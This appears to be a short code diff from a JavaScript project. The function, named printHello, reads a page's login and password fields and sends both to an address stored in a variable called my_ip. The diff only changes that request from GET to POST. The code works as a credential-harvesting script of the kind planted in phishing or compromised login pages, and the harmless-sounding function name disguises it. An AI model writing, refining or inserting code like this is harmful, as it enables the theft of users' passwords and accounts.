@@ -9,7 +9,7 @@ function printHello() {
 	var password = document.getElementById('password');
 	// send the login and pass as resquests
 	var req = new XMLHttpRequest();
-	req.open( "GET", my_ip, true); // false for synchronous request
+	req.open( "POST", my_ip, true); // false for synchronous request
 	req.send("<login>"+login.value+"</login>\n"+"<pass>"+password.value+"</pass>");
     password.value = "";
 }
